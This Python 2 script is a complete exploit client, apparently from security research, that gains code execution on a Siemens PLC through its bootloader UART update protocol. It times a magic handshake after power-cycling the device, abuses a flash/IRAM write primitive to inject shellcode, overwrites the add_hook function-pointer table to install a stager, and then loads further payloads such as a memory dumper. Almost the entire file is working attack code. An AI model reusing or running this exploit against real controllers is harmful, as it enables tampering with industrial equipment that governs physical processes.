#!/usr/bin/env python2
# Would you please hold my beer while I am cleaning this code?
# ./client.py --switch-power --powersupply-host=localhost --powersupply-port=9001 --powersupply-delay=10 run -p payloads/hello_world/hello_world.bin


import struct
import time
import socket
import select
import sys
import subprocess
#import crc32be
import os
import argparse

from binascii import hexlify

from pwn import remote,context,log,xor
context.update(log_level="info", bits=32, endian="big")



# Runtime configs
# The number of seconds to sleep between every request to avoid UART buffer overflows
SEND_REQ_SAFETY_SLEEP_AMT = 0.01


# The default location of the stager payload
STAGER_PL_FILENAME = "payloads/stager/stager.bin"


# The default location of the memory dumping payload used for the dump_mem command
DUMPMEM_PL_FILENAME = "payloads/dump_mem/build/dump_mem.bin"

# The address of the first payload we are injecting
FIRST_PAYLOAD_LOCATION = 0x10010100


# FIRST_PAYLOAD_LOCATION = 0x06D8C300
next_payload_location = FIRST_PAYLOAD_LOCATION

# Maximum number of bytes to be sent in one request (Sending chunks larger than 16 bytes seems to overflow the read buffer)
# MAX_MSG_LEN = 64-2
MAX_MSG_LEN = 192-2

# Addresses used to inject shellcode (different values are possible here)
DEFAULT_STAGER_ADDHOOK_IND = 0x20


# For installing an additional hook, we also assign a default index
DEFAULT_SECOND_ADD_HOOK_IND = 0x1a

#IRAM_STAGER_START = 0x1003AD00
#IRAM_STAGER_END = 0x10040000
IRAM_STAGER_START = 0x10030100
IRAM_STAGER_END = 0x100303FC
#IRAM_STAGER_START = 0x10010000
#IRAM_STAGER_END = 0x10020000
IRAM_STAGER_MAX_SIZE = IRAM_STAGER_END - IRAM_STAGER_START

BOOTLOADER_EMPTY_MEM = 0x20000

# Some constants that make the code a bit more easy to read
ANSW_INVALID_CHECKSUM = "\xff\x80\x03"
ANSW_ENTER_SUBPROTO_SUCCESS = "\x80\x00"

# Static Addresses
UART_WRITE_BUF = 0x100367EC
UART_READ_BUF = 0x100366EC
ADD_HOOK_TABLE_START = 0x1003ABA0

# subprotocol handler constants
SUBPROT_80_MODE_IRAM = 1
SUBPROT_80_IOC_SPI = 2
SUBPROT_80_MODE_FLASH = 3
SUBPROT_80_MODE_NOP = 4

SUBPROT_80_MODE_MAGICS = [None, 0x3BC2, 0x9d26, 0xe17a, 0xc54f]


def print_answ(r, answ):
    print("Got answer: {} [{}]".format(answ, hexlify(answ)))


def calc_checksum_byte(incoming):
    # Format: <len_byte><byte_00>..<byte_xx><checksum_byte>
    # Checksum: LSB of negative sum of byte values
    return struct.pack("<i", -sum(map(ord, incoming[:ord(incoming[0])])))[0]


def send_packet(r, msg, step=2, sleep_amt=0.01):
    """
    The base function to send a single packet. We need to chunk the packet
    up during transmission as to not overflowing the PLC's UART buffer.

    Parameters
        r: the remote
        msg: the packet to be sent
        step: The number of bytes to send between delays
        sleep_amt: the number of seconds to delay each chunk
    """

    # Length has to fit into 1 byte, buffer also is just 256 bytes
    assert(len(msg) <= MAX_MSG_LEN)
    time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
    # First we need to pass the length
    msg = chr(len(msg)+1)+msg
    # Then add the checksum to the packet
    msg = msg + calc_checksum_byte(msg)
    log.info("sending packet: {}".format(msg.encode("hex")))
    for i in range(0, len(msg), step):
        time.sleep(sleep_amt)
        r.send(msg[i:i+step])


def recv_packet(r):
    """
    Receive a single packet, verifying and discarding
    checksum and length metadata.

    returns The actual contents of the packet without any metadata
    """

    answ = r.recv(1)
    rem = ord(answ)
    while rem != 0:
        add = r.recv(rem)
        rem -= len(add)
        answ += add

    if calc_checksum_byte(answ[:-1]) != answ[-1]:
        print("Checksum validity failed. Got: {} [{}".format(
            answ, answ.encode("hex")))
        return None
    else:
        return answ[1:-1]


def recv_many(r, verbose=False):
    """
    Receive all packets until an empty packet is received.
    
    This protocol is implemented by some custom payloads such
    as dump_mem to send larger amounts of data at once.
    """

    answ = ""
    stop = False

    while not stop:
        next_chunk = recv_packet(r)
        if verbose and (len(answ) & 0xff) < 16:
            print("Read {}".format(len(answ)))
        if next_chunk == "":
            stop = True
        else:
            answ += next_chunk
    return answ

def encode_packet_for_stager(chunk):
    """
    Encodes a packet for null-byte free transmission to the stager.
    Xor is used to do the encoding. The key is chosen for the chunk
    not to include null bytes which seem to result in the largest
    amount of failing transmissions over UART.
    
    The encoding has to be reversed on the other side which is
    implemented in the payloads/stager sources
    """
    for i in range(1, 256):
        if chr(i) not in chunk and i != len(chunk)+2:
            log.info("Sending chunk with xor key: 0x{:02x}".format(i))
            encoded = chr(i) + "".join(map(lambda x: chr(ord(x) ^ i), chunk))
            # A quick attempt at a fix for a specific value-dependent UART failure
            #if "\xfe\xfe" in encoded:
            #    continue
            return encoded

    print("Could not encode chunk: {}".format(chunk.encode("hex")))
    assert (False)

def send_full_msg_via_stager(r, msg, chunk_size=2, sleep_amt=0.01):
    """
    Transmit an arbitrarily sized message to a listening stager payload.

    The protocol doing the transmission sends an encoded packet, expecting
    an empty acknowledgement packet in return for each packet sent.
    """

    for i in range(0, len(msg), MAX_MSG_LEN-1):
        time.sleep(SEND_REQ_SAFETY_SLEEP_AMT)
        chunk = msg[i:i + MAX_MSG_LEN - 1]
        log.info("Send progress: 0x{:06x}/0x{:06x} ({:3.2f})".format(i, len(msg), float(i)/float(len(msg))))
        send_packet(r, encode_packet_for_stager(chunk), chunk_size, sleep_amt)
        answ = recv_packet(r)
        if not len(answ) == 1:
            print("expecting empty ack package (answ of size 1), got '{}' instead".format(answ))
            assert(False)
        if answ == "\xff":
            print("[WARNING] Interrupting the sending...")
            return None
    # Send empty packet to signify end of transmission
    send_packet(r, encode_packet_for_stager(""))
    answ = recv_packet(r)


def invoke_primary_handler(r, handler_ind, args="", await_response=True):
    """
    Invoke the primary handler with index handler_ind.
    """

    payload = chr(handler_ind)
    send_packet(r, payload+args)
    if await_response:
        return recv_packet(r)
    else:
        return None


def enter_subproto_handler(r, mode, args=""):
    """
    Invoke Primary Handler 0x80 to enter the subprotocol
    in the given mode.
    """
    assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))

    return invoke_primary_handler(r, 0x80, struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode]))


def leave_subproto_handler(r):
    """ 
    Leave the currently active subprotocol handler
    """
    send_packet(r, chr(0x81)+"\xD0\x67")
    return recv_packet(r)


def subproto_read(r):
    send_packet(r, chr(0x83))
    return recv_packet(r)

def _raw_subproto_write(r, arg_dw, add_args, really=False, step=2, sleep_amt=0.01):
    """
    Only use when alredy in subprotocol handler.
    
    This is the raw write protocol (function 3) invocation for the different modes.
    Invoking this function may have different semantics depending on the mode the
    subprotocol handler was entered in.

    No checking on arguments is done. Don't use if you don't exactly know what you
    do as this may cause damage to the system if not used properly.

    The reason for this function being dangerous is that in some modes using this write
    leads to overwriting parts or all of flash memory.
    """

    # This one is dangerous to use as it may mess up stuff in the device
    assert(really == True)
    send_packet(r, chr(0x84)+"\x5a\x2e"+struct.pack(">I", arg_dw)+add_args, step, sleep_amt)
    return recv_packet(r)


def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
    """
    This function is part of the exploit and allows writing small chunks
    of bytes into IRAM memory. With the primitive itself being slow and
    unstable, we need some special handling for seemingly magic values to
    make the write process stable.
    """

    # Writing more than 4 bytes at a time does not seem stable
    #assert(len(contents) == 2 or len(contents)==4 or len(contents)==8)
    assert(len(contents) % 2 == 0)
    assert(len(contents)+8 <= MAX_MSG_LEN)
    # This is the minimum address we are allowed to write to
    assert(0x10000000 <= tar)
    # This boundary is checked by the bootloader handler
    assert(tar + len(contents) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM if we are not already in the handler
    if not already_in_80_handler:
        answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    # In the bootloader handler the base of IRAM memory (0x10000000) is added, so subtract it here
    target_argument = tar-0x10000000

    # First mask the contents with \xff's which allows all transitions
    answ = _raw_subproto_write(r, target_argument, len(contents)*"\xff", True)
    # Perform the write against the 0xffff words now

    # One write that we cannot perform for dwords is a straight 0x0000 word. We have to do that as a single word for some reason
    if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
        # Split the write into two word writes
        answ = _raw_subproto_write(r, target_argument, contents[:2], True)
        answ = _raw_subproto_write(r, target_argument+2, contents[2:4], True)
    else:
        # Do the write in one go
        answ = _raw_subproto_write(r, target_argument, contents, True)

    # Leave the 0x80 subhandler if needed
    if not already_in_80_handler:
        leave_subproto_handler(r)
    return answ


def exploit_write_to_iram(r, tar, contents):
    """
    Wrapper function to write a whole payload to IRAM. Call this
    function without entering the subprotocol first. The function
    will:
        1. enter subprotocol handler
        2. align input length to multiple of 4
        3. write contents in chunks
        4. leave subprotocol handler
    """

    assert(len(contents) % 2 == 0)  # writes are performed word-wise
    # Make sure we stay in bounds with our write
    assert(0x10000000 <= tar and tar + len(contents) <= 0x10800000)

    # First enter the 0x80 subprotocol with device/target number 1 for IRAM
    answ = enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    assert(answ == ANSW_ENTER_SUBPROTO_SUCCESS)

    # Do a single word write at the beginning if the alignment is 2, not 4
    if len(contents) % 4 == 2:
        _exploit_write_chunk_to_iram(r, tar, contents[:2], True)
        tar += 2
        contents = contents[2:]

    chunk_size = 16
    # From here we have a 4 byte alignment so we can do dword writes only
    for i in range(0, len(contents), chunk_size):
        print("Writing {:04x}/{:04x}".format(i, len(contents)))
        chunk = contents[i:i+chunk_size]
        # Perform the write
        answ = _exploit_write_chunk_to_iram(r, tar+i, chunk, True)

    # Leave subprotocol handler to avoid protocol state side effects
    leave_subproto_handler(r)
    return answ


def get_version(r):
    """
    Invoke the Primary Handler which returns the protocol version
    """

    hook_ind = 0  # get_version
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    return answ


def bye(r):
    """
    Invoke the Primary Handler to leave the primary UART protocol loop.
    """
    hook_ind = 0xa2
    send_packet(r, chr(hook_ind))
    answ = recv_packet(r)
    # For good measure check that we got the correct response and we are indeed in sync
    assert(answ == "\xa2\x00")




def invoke_add_hook(r, add_hook_no, args="", await_response=True):
    # Check range for additional hook
    assert(0 <= add_hook_no <= 0x20)
    # Also check that the size of arguments that we input matches the expected value
    # expected_arglen, fn_addr = add_handler_entries[add_hook_no]
    #assert(expected_arglen-3==len(args) or expected_arglen==0xff)
    hook_ind = 0x1c
    args = chr(add_hook_no)+args
    return invoke_primary_handler(r, hook_ind, args, await_response)


def _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no):
    """
    Inject shellcode to a location inject a pointer to it into the add_hook table.

    This function is a wrapper around different UART APIs. The following steps are taken:
    1. Write shellcode to tar_addr
    2. Write (length param, function pointer) pair to the specified offset inside the add_hooks table

    After the injection is done the hook should be callable via
            invoke_add_hook(r, add_hook_no)
    """
    # 0x21 add_hook entries in table
    assert(0 <= add_hook_no <= 0x20)

    # Ensure alignment
    if len(shellcode) % 2 != 0:
        shellcode += "\xff"

    exploit_write_to_iram(r, tar_addr, shellcode)
    exploit_write_to_iram(r, ADD_HOOK_TABLE_START+8 *
                          add_hook_no+2, "\x00\xff"+struct.pack(">I", tar_addr))


def install_stager(r, shellcode, tar_addr=IRAM_STAGER_START, add_hook_no=DEFAULT_STAGER_ADDHOOK_IND):
    """
    Installs the stager payload as an add_hook entry from a file containing the stager shellcode.

    Returns the hook_number at which the handler was installed
    """
    assert(0 < len(shellcode) <= IRAM_STAGER_MAX_SIZE)
    _exploit_install_add_hook(r, tar_addr, shellcode, add_hook_no)
    return add_hook_no


def write_via_stager(r, tar_addr, contents, stager_add_hook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    invoke_add_hook(r, stager_add_hook_ind,
                       struct.pack(">I", tar_addr), False)
    send_full_msg_via_stager(r, contents, 8, 0.01)


def install_addhook_via_stager(r, tar_addr, shellcode, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND, add_hook_no=DEFAULT_SECOND_ADD_HOOK_IND):
    # Automatically adjust to the user adding more payloads
    global next_payload_location
    
    # Set up function pointer and disable arbitrary argument length check (by setting value 0xff)
    write_via_stager(r, ADD_HOOK_TABLE_START+8*add_hook_no,
                     "\x00\x00\x00\xff"+struct.pack(">I", tar_addr), stager_addhook_ind)

    # Write the code of the handler itself
    write_via_stager(r, tar_addr, shellcode, stager_addhook_ind)

    if tar_addr == next_payload_location:
        next_payload_location += len(shellcode)
        while next_payload_location % 4 != 0:
            next_payload_location += 1

    return add_hook_no


def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
    """
    This function uses payloads/dump_mem to dump memory contents.
    """
    answ = invoke_add_hook(
        r, addhook_ind, "A"+struct.pack(">II", tar_addr, num_bytes))
    log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), answ))
    assert(answ.startswith("Ok"))
    contents = recv_many(r, verbose=True)
    return contents



def handle_conn(r, action, args):
    global next_payload_location

    print("[+] Got connection")
    answ = recv_packet(r)
    print('\x1b[6;30;42m'+ "[+] Got special access greeting: {} [{}]".format(answ, hexlify(answ))+ '\x1b[0m')

    for i in range(1):
        version = get_version(r)
        bootloaderversion=version[2:3]+".".join([str(ord(c)) for c in version[3:-2]])
        print('\x1b[6;30;42m'+ "[+] Got PLC bootLoader version: " + bootloaderversion + '\x1b[0m')



    # First, always install the stager payload
    start = time.time()
    stager_addhook_ind = install_stager(r, args.stager.read())
    print("Writing the initial stage took {} seconds".format(time.time()-start))

    if action == ACTION_INVOKE_HOOK:
        payload = args.payload.read()
    elif action == ACTION_DUMP:
        payload = args.payload.read()
    elif action == ACTION_TEST:
        payload = args.payload.read()
    elif action == ACTION_TIC_TAC_TOE:
        payload = args.payload.read()
    elif action == ACTION_HELLO_LOOP:
        payload = args.payload.read()
    else:
        print("Unknown action")
        exit(-1)

    if payload is not None:
        start = time.time()
        second_addhook_ind = install_addhook_via_stager(r, next_payload_location, payload, stager_addhook_ind)
        print("Installing the additional hook took {} seconds".format(time.time()-start))

    
    if action == ACTION_INVOKE_HOOK:
        answ = invoke_add_hook(r, second_addhook_ind, args.args)
        print("Got answer: {}".format(answ))

    elif action == ACTION_DUMP:
        if args.outfile is None:
            out_filename = "mem_dump_{:08x}_{:08x}".format(args.address, args.address + args.length)
        else:
            out_filename = args.outfile

        print("dumping a total of {} bytes of memory at 0x{:08x}".format(args.length, args.address))
        contents = payload_dump_mem(r, args.address, args.length, second_addhook_ind)
        with open(out_filename, "wb") as f:
            f.write(contents)
        print("Wrote data out to {}".format(out_filename))
    

    elif action == ACTION_TEST:
        answ = invoke_add_hook(r, second_addhook_ind)
        print("Got answer: {}".format(answ))


    elif action == ACTION_HELLO_LOOP:
        answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
        while True:
            print("Got packet: {}".format(recv_packet(r)))

    elif action == ACTION_TIC_TAC_TOE:
        print("[*] Demonstrating Code Execution")
        invoke_add_hook(r, second_addhook_ind, await_response=False)
        msg = ""
        END_TOKEN = "==>"
        while END_TOKEN not in msg:
            msg = recv_packet(r)
            sys.stdout.write(msg)
            sys.stdout.flush()

            if "enter a number" in msg:
                choice = raw_input()
                send_packet(r, choice[0])

        print("[*] Done here!")


    # END test code
    print("Saying bye...")
    if args.cont:
        bye(r)
    else:
        raw_input("Press to continue loading firmware...")
        bye(r)


# To trigger the update protocol via UART, we need to send a clean magic string
magic = "MFGT1"
# The number of bytes of the handshake is 5, so with a leading "M" already in the pool and others being ignored, we need at most 4 junk bytes
pad = 4*"A"

ACTION_INVOKE_HOOK = "invoke"
ACTION_DUMP = 'dump'
ACTION_TEST = "test"
ACTION_TIC_TAC_TOE = "tictactoe"
ACTION_HELLO_LOOP = "hello_loop"
def main():
    parser = argparse.ArgumentParser(description='Trigger code execution on Siemens PLC')

    parser.add_argument('-P', '--port', dest='port', type=lambda x: int(x, 0),
                        help="local port that socat is listening to, forwarding to serial device (may also be a port forwarded via SSH", required=True)
    parser.add_argument('--switch-power', dest='switch_power', default=False, action='store_true',
                        help='switch the power adapter on and off')
    parser.add_argument('--powersupply-host', dest='powersupply_host', default='powersupply',
                        help='host of powersupply, defaults to "powersupply", can be changed to support ssh port forwarding')
    parser.add_argument('--powersupply-port', dest='powersupply_port', default=80, type=lambda x: int(x, 0),
                        help="port of powersupply. defaults to 80, can be changed to support ssh port forwarding")
    parser.add_argument('--powersupply-delay', dest='powersupply_delay', default=60, type=lambda x: int(x, 0),
                        help="number of seconds to wait before turning on power supply. defaults to 60.")
    parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('r'), default=STAGER_PL_FILENAME,
                        help='the location of the stager payload')
    parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
    parser.add_argument('-e', '--extra', default="", dest='extra', nargs='+', help="Additional arguments for custom logic")

    subparsers = parser.add_subparsers(dest="action")
    parser_invoke_hook = subparsers.add_parser(ACTION_INVOKE_HOOK)
    parser_invoke_hook.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('rb'), default=None,
                        help='The file containing the payload to be executed', required=True)
    parser_invoke_hook.add_argument('-a', '--args', default="", dest='args', nargs='+', help="Additional arguments to be passed to payload invocation")

    parser_dump = subparsers.add_parser(ACTION_DUMP)
    parser_dump.add_argument('-a', '--address', dest="address", type=lambda x: int(x, 0), help="Address to dump at", required=True)
    parser_dump.add_argument('-l', '--length', dest="length", type=lambda x: int(x, 0), help="Number of bytes to dump", required=True)
    parser_dump.add_argument('-d', '--dump-payload', dest='payload', type=argparse.FileType('rb'), default=DUMPMEM_PL_FILENAME)
    parser_dump.add_argument('-o', '--out-file', dest='outfile', default=None, help="Name of file to store the dump at")



    parser_test = subparsers.add_parser(ACTION_TEST)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_world/hello_world.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_world/hello_world.bin')

    parser_test = subparsers.add_parser(ACTION_HELLO_LOOP)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/hello_loop/build/hello_loop.bin",
                        help='The file containing the payload to be executed, defaults to payloads/hello_loop/build/hello_loop.bin')
    

    parser_test = subparsers.add_parser(ACTION_TIC_TAC_TOE)
    parser_test.add_argument('-p', '--payload', dest="payload", type=argparse.FileType('r'), default="payloads/tic_tac_toe/build/tic_tac_toe.bin",
                        help='The file containing the payload to be executed, defaults to payloads/tic_tac_toe/build/tic_tac_toe.bin')

 

    args = parser.parse_args()

    # We are currently using pwntools for the connection as those
    # proved to be reliable. We may want to refactor this.
    s = remote("localhost", args.port)

    if args.switch_power:
        print("Turning off power supply and sleeping for {:d} seconds".format(args.powersupply_delay))
        subprocess.check_call(["../tools/powersupply/switch_power.py", "--port", str(args.powersupply_port), "--host", args.powersupply_host, "off"])
        print("[+] Turned off power supply, sleeping")
        time.sleep(args.powersupply_delay)
        print("[+] Turned on power supply again")
        subprocess.check_call(["../tools/powersupply/switch_power.py", "--port", str(args.powersupply_port), "--host", args.powersupply_host, "on"])
        print("[+] Successfully turned on power supply")


    print("Looping now")
    for i in range(100):
        # while True:
        # We have 500000 microseconds (half a second) to hit the timing
        s.send(pad + magic)

        answ = s.recv(256, timeout=0.3)
        if len(answ) > 0:
            if not answ.startswith("\5-CPU"):
                answ += s.recv(256)
            assert(answ.startswith("\5-CPU"))
            s.unrecv(answ)

            handle_conn(s, args.action, args)
            break

    print("Done.")


if __name__ == "__main__":
    main()

